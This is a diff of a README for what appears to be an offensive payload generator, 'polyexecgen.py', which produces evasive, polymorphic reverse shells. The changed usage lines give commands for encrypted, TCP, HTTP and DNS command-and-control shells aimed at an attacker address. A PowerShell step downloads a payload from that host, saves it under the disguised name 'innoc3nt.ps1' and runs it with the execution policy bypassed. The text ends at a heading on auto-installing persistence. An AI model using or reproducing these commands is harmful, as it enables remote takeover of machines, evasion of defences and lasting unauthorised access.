@@ -25,24 +25,26 @@ junk code<br>
 no two payloads alike<br>
 Traffic jitter<br>
 
-# I NO READ! I USE NOW:<br>
+## USAGE:<br>
     ### Encrypted shell -- full evasion
-    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -k mygoodpassword
+    ./polyexecgen.py -t 192.168.1.5 -p 4444 -m encrypted -k mygoodpassword
     
     ### basic TCP sh
-    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp
+    ./polyexecgen.py -t 192.168.1.5 -p 4444 -m tcp
     
     ### HTTP --  web traffic
-    ./polyexecgen.py -t http://192.168.1.100:8080/shell -m http -k myk3y
+    ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
     
     ### DNS C2 (sneaky)
     ./polyexecgen.py -m dns --dns-domain c2.example.com
-<br>
+
+---
+
 <br>
 
 ## start the sh3ll catch3r: <br>
 
-### For encrypted mode:
+### Encrypted mode:
 
 <br>
 
@@ -55,9 +57,9 @@ Traffic jitter<br>
 ### powershell On Windows target:
 
     Invoke-WebRequest http://192.168.1.5:6969/payloads/polyexec_encrypted_*.ps1 -OutFile innoc3nt.ps1
-    powershell.exe -ExecutionPolicy Bypass -File innocent.ps1
+    powershell.exe -ExecutionPolicy Bypass -File innoc3nt.ps1
 
-### persistance:
+### Persistance:
 
  payload w/ auto install persistence:
  
